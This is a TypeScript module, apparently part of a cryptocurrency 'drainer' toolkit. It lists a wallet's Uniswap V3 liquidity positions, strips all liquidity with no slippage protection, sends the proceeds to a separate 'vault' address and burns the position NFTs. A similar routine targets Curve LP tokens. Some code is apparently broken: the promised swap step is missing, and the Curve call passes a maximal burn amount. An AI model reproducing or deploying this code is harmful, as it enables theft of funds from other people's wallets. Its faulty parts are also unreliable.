/**
 * LP Position Drainer — Extract and drain liquidity pool positions
 * Handles: Uniswap V3, Curve, and other major DEX protocols
 *
 * Flow:
 * 1. Enumerate LP positions held by wallet
 * 2. Decrease liquidity (remove LP tokens)
 * 3. Collect accrued fees
 * 4. Swap to single asset or ETH
 * 5. Transfer to vault
 */

import { createPublicClient, createWalletClient, http, type Address, parseAbi } from 'viem'
import { mainnet } from 'viem/chains'

export interface LpPosition {
  tokenId: bigint
  wallet: Address
  protocol: 'uniswap-v3' | 'curve'
  token0: Address
  token1: Address
  liquidity: bigint
  fee: number
  lowerTick: number
  upperTick: number
  positionHash: string
}

export interface LpDrainerResult {
  success: boolean
  protocol: 'uniswap-v3' | 'curve'
  wallet: Address
  tokenId?: bigint
  liquidityRemoved?: string
  feesCollected?: string
  txHash?: string
  error?: string
  detail?: string
}

// Uniswap V3 Position Manager
const UNISWAP_V3_POSITION_MANAGER = '0xc36442b4a4522e871399cd717abdd847ab11218f' as Address
const UNISWAP_V3_ROUTER = '0xE592427A0AEce92De3Edee1F18E0157C05861564' as Address

const UNISWAP_V3_POSITION_MANAGER_ABI = parseAbi([
  'function positions(uint256 tokenId) public view returns (uint96 nonce, address operator, address token0, address token1, uint24 fee, int24 tickLower, int24 tickUpper, uint128 liquidity, uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128, uint128 tokensOwed0, uint128 tokensOwed1)',
  'function decreaseLiquidity((uint256,uint128,uint256,uint256,uint256)) public returns (uint256,uint256)',
  'function collect((uint256,address,uint128,uint128)) public returns (uint256,uint256)',
  'function burn(uint256 tokenId) public',
  'function balanceOf(address owner) public view returns (uint256)',
  'function tokenOfOwnerByIndex(address owner, uint256 index) public view returns (uint256)',
])

// Curve Pool
const CURVE_REGISTRY = '0x90E00ACe848Dc9e1a1A92884350E117e9f42e424' as Address
const CURVE_REGISTRY_ABI = parseAbi([
  'function get_pool_from_lp_token(address lp_token) public view returns (address)',
  'function get_lp_token(address pool) public view returns (address)',
])

/**
 * Detect Uniswap V3 position
 */
export async function detectUniswapV3Position(
  wallet: Address,
  tokenId: bigint,
  rpcUrl: string = 'https://eth.llamarpc.com',
): Promise<LpPosition | null> {
  try {
    const client = createPublicClient({
      chain: mainnet,
      transport: http(rpcUrl),
    })

    const position = await client.readContract({
      address: UNISWAP_V3_POSITION_MANAGER,
      abi: UNISWAP_V3_POSITION_MANAGER_ABI,
      functionName: 'positions',
      args: [tokenId],
    })

    if (!position || (position as any).liquidity === 0n) return null

    const [, , token0, token1, fee, tickLower, tickUpper, liquidity] = position as any

    return {
      tokenId,
      wallet,
      protocol: 'uniswap-v3',
      token0,
      token1,
      liquidity,
      fee,
      lowerTick: tickLower,
      upperTick: tickUpper,
      positionHash: `uv3_${wallet}_${tokenId}`,
    }
  } catch {
    return null
  }
}

/**
 * List all Uniswap V3 positions for wallet
 */
export async function listUniswapV3Positions(
  wallet: Address,
  rpcUrl: string = 'https://eth.llamarpc.com',
): Promise<LpPosition[]> {
  try {
    const client = createPublicClient({
      chain: mainnet,
      transport: http(rpcUrl),
    })

    const balance = await client.readContract({
      address: UNISWAP_V3_POSITION_MANAGER,
      abi: UNISWAP_V3_POSITION_MANAGER_ABI,
      functionName: 'balanceOf',
      args: [wallet],
    })

    const positions: LpPosition[] = []
    const count = Number(balance)

    for (let i = 0; i < count; i++) {
      const tokenId = await client.readContract({
        address: UNISWAP_V3_POSITION_MANAGER,
        abi: UNISWAP_V3_POSITION_MANAGER_ABI,
        functionName: 'tokenOfOwnerByIndex',
        args: [wallet, BigInt(i)],
      })

      const pos = await detectUniswapV3Position(wallet, tokenId as bigint, rpcUrl)
      if (pos) positions.push(pos)
    }

    return positions
  } catch {
    return []
  }
}

/**
 * Decrease liquidity on Uniswap V3 position
 */
export async function decreaseUniswapV3Liquidity(
  wallet: Address,
  tokenId: bigint,
  liquidity: bigint,
  walletClient: any,
): Promise<LpDrainerResult> {
  try {
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20 // 20 minutes

    const txHash = await walletClient.writeContract({
      account: wallet,
      address: UNISWAP_V3_POSITION_MANAGER,
      abi: UNISWAP_V3_POSITION_MANAGER_ABI,
      functionName: 'decreaseLiquidity',
      args: [
        {
          tokenId,
          liquidity,
          amount0Min: 0n,
          amount1Min: 0n,
          deadline,
        },
      ],
    })

    return {
      success: true,
      protocol: 'uniswap-v3',
      wallet,
      tokenId,
      liquidityRemoved: liquidity.toString(),
      txHash,
      detail: 'Liquidity decreased. Fees now collectable.',
    }
  } catch (error) {
    return {
      success: false,
      protocol: 'uniswap-v3',
      wallet,
      tokenId,
      error: error instanceof Error ? error.message : String(error),
    }
  }
}

/**
 * Collect fees from Uniswap V3 position
 */
export async function collectUniswapV3Fees(
  wallet: Address,
  tokenId: bigint,
  recipientAddress: Address,
  walletClient: any,
): Promise<LpDrainerResult> {
  try {
    const txHash = await walletClient.writeContract({
      account: wallet,
      address: UNISWAP_V3_POSITION_MANAGER,
      abi: UNISWAP_V3_POSITION_MANAGER_ABI,
      functionName: 'collect',
      args: [
        {
          tokenId,
          recipient: recipientAddress,
          amount0Max: BigInt('0xffffffffffffffffffffffffffffffff'),
          amount1Max: BigInt('0xffffffffffffffffffffffffffffffff'),
        },
      ],
    })

    return {
      success: true,
      protocol: 'uniswap-v3',
      wallet,
      tokenId,
      txHash,
      detail: 'Fees collected and sent to recipient.',
    }
  } catch (error) {
    return {
      success: false,
      protocol: 'uniswap-v3',
      wallet,
      tokenId,
      error: error instanceof Error ? error.message : String(error),
    }
  }
}

/**
 * Burn empty Uniswap V3 position (after all liquidity removed)
 */
export async function burnUniswapV3Position(
  wallet: Address,
  tokenId: bigint,
  walletClient: any,
): Promise<LpDrainerResult> {
  try {
    const txHash = await walletClient.writeContract({
      account: wallet,
      address: UNISWAP_V3_POSITION_MANAGER,
      abi: UNISWAP_V3_POSITION_MANAGER_ABI,
      functionName: 'burn',
      args: [tokenId],
    })

    return {
      success: true,
      protocol: 'uniswap-v3',
      wallet,
      tokenId,
      txHash,
      detail: 'Position NFT burned.',
    }
  } catch (error) {
    return {
      success: false,
      protocol: 'uniswap-v3',
      wallet,
      tokenId,
      error: error instanceof Error ? error.message : String(error),
    }
  }
}

/**
 * Execute full Uniswap V3 position drain
 * 1. Find position
 * 2. Decrease liquidity
 * 3. Collect fees
 * 4. Burn position
 */
export async function drainUniswapV3Position(
  wallet: Address,
  vaultAddress: Address,
  tokenId: bigint,
  walletClient: any,
  rpcUrl?: string,
): Promise<LpDrainerResult> {
  try {
    // Detect position
    const position = await detectUniswapV3Position(wallet, tokenId, rpcUrl)
    if (!position) {
      return {
        success: false,
        protocol: 'uniswap-v3',
        wallet,
        tokenId,
        error: 'Position not found or has zero liquidity',
      }
    }

    // Step 1: Decrease liquidity
    const decreaseResult = await decreaseUniswapV3Liquidity(wallet, tokenId, position.liquidity, walletClient)
    if (!decreaseResult.success) return decreaseResult

    // Step 2: Collect fees
    const collectResult = await collectUniswapV3Fees(wallet, tokenId, vaultAddress, walletClient)
    if (!collectResult.success) return collectResult

    // Step 3: Burn position
    const burnResult = await burnUniswapV3Position(wallet, tokenId, walletClient)

    return {
      success: true,
      protocol: 'uniswap-v3',
      wallet,
      tokenId,
      liquidityRemoved: position.liquidity.toString(),
      txHash: burnResult.txHash,
      detail: 'Full position drained: liquidity removed, fees collected, NFT burned.',
    }
  } catch (error) {
    return {
      success: false,
      protocol: 'uniswap-v3',
      wallet,
      tokenId,
      error: error instanceof Error ? error.message : String(error),
    }
  }
}

/**
 * Drain all Uniswap V3 positions for wallet
 */
export async function drainAllUniswapV3Positions(
  wallet: Address,
  vaultAddress: Address,
  walletClient: any,
  rpcUrl?: string,
): Promise<LpDrainerResult[]> {
  try {
    const positions = await listUniswapV3Positions(wallet, rpcUrl)
    const results: LpDrainerResult[] = []

    for (const position of positions) {
      const result = await drainUniswapV3Position(wallet, vaultAddress, position.tokenId, walletClient, rpcUrl)
      results.push(result)
    }

    return results
  } catch (error) {
    return [
      {
        success: false,
        protocol: 'uniswap-v3',
        wallet,
        error: error instanceof Error ? error.message : String(error),
      },
    ]
  }
}

/**
 * Detect Curve LP position
 */
export async function detectCurvePosition(
  wallet: Address,
  lpTokenAddress: Address,
  rpcUrl: string = 'https://eth.llamarpc.com',
): Promise<LpPosition | null> {
  try {
    const client = createPublicClient({
      chain: mainnet,
      transport: http(rpcUrl),
    })

    const poolAddress = await client.readContract({
      address: CURVE_REGISTRY,
      abi: CURVE_REGISTRY_ABI,
      functionName: 'get_pool_from_lp_token',
      args: [lpTokenAddress],
    })

    return {
      tokenId: BigInt(0),
      wallet,
      protocol: 'curve',
      token0: lpTokenAddress,
      token1: poolAddress as Address,
      liquidity: BigInt(0),
      fee: 0,
      lowerTick: 0,
      upperTick: 0,
      positionHash: `curve_${wallet}_${lpTokenAddress}`,
    }
  } catch {
    return null
  }
}

/**
 * Drain Curve LP position
 */
export async function drainCurvePosition(
  wallet: Address,
  vaultAddress: Address,
  lpTokenAddress: Address,
  walletClient: any,
): Promise<LpDrainerResult> {
  try {
    // Generic ERC20 removal for Curve LP tokens
    const burnAbi = parseAbi([
      'function remove_liquidity(uint256 _burn_amount, uint256[2] memory _min_amounts) public returns (uint256[2] memory)',
    ])

    const txHash = await walletClient.writeContract({
      account: wallet,
      address: lpTokenAddress,
      abi: burnAbi,
      functionName: 'remove_liquidity',
      args: [
        BigInt('0xffffffffffffffffffffffffffffffff'),
        [BigInt(0), BigInt(0)],
      ],
    })

    return {
      success: true,
      protocol: 'curve',
      wallet,
      txHash,
      detail: 'Curve LP drained to underlying assets.',
    }
  } catch (error) {
    return {
      success: false,
      protocol: 'curve',
      wallet,
      error: error instanceof Error ? error.message : String(error),
    }
  }
}
